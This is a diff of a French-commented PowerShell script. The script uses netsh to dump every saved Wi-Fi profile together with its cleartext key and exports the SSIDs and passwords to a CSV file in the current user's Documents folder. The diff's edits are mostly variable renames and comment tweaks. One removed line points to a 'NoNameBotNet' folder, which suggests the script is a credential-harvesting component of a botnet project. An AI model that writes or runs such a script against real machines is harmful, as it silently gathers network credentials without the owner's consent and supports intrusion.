@@ -4,37 +4,38 @@
 # Version: 0.1
 # Auteur: Paul RICHIARDI
 #
-# Permet de stocker dans un CSV l'ensemble des réseaux WIFI et leurs clés où l'utilisateur s'est déjà connecté
+# Description: Permet de stocker dans un CSV l'ensemble des réseaux WIFI et leurs clés où l'utilisateur s'est déjà connecté
 #
 #######################
 
 
-### Commande principale 
+### Commandes principales 
 
 # netsh wlan show profiles 
 # netsh wlan show profile name=<profile> key=clear
 
-$User = "$Env:Username" #Récupère l'utilisateur courant de la session
 
-$wifi=@() #creation de tableau
+$User = "$Env:Username" # Récupère l'utilisateur courant de la session
+
+$wifi=@() # Creation de tableau
 
 # Visualisation des SSID de réseaux bloqués
-$cmd0=netsh wlan show blockednetworks
+$SSIDBlocked=netsh wlan show blockednetworks
 
-# Liste l'ensemble des SSID
-$cmd1=netsh wlan show profiles
+#Liste l'ensemble des SSID
+$SSIDList=netsh wlan show profiles
 
-ForEach($row1 in $cmd1)
+ForEach($item1 in $SSIDList)
 {
     #Récupération des SSID par expression régulière
-    If($row1 -match 'Profil Tous les utilisateurs[^:]+:.(.+)$')
+    If($item1 -match 'Profil Tous les utilisateurs[^:]+:.(.+)$')
     {
         $ssid=$Matches[1]
-        $cmd2=netsh wlan show profiles $ssid key=clear
-        ForEach($row2 in $cmd2)
+        $SSIDListKey=netsh wlan show profiles $ssid key=clear
+        ForEach($item2 in $SSIDListKey)
         {
             #Récupération des clés par expression régulière
-            If($row2 -match 'Contenu de la c[^:]+:.(.+)$')
+            If($item2 -match 'Contenu de la c[^:]+:.(.+)$')
             {
                 $key=$Matches[1]
                 #Stockage des SSID et clés dans un tableau
@@ -45,8 +46,5 @@ ForEach($row1 in $cmd1)
 }
 
 #Export du tableau dans un fichier csv
-$pathfile = 'C:\Users\'+$User+'\Documents\wifi.csv'
-$wifi|Export-CSV -Path $pathfile -NoTypeInformation
-
-
-# $wifi|Export-CSV -Path 'C:\Users\Paul\Documents\GitHub\NoNameBotNet\Recup Data\wifi.csv' -NoTypeInformation
+$pathfile = 'C:\Users\'+$User+'\Documents\wifi.csv' #Création du chemin du fichier selon le nom de l'user
+$wifi|Export-CSV -Path $pathfile -NoTypeInformation #Export du CSV
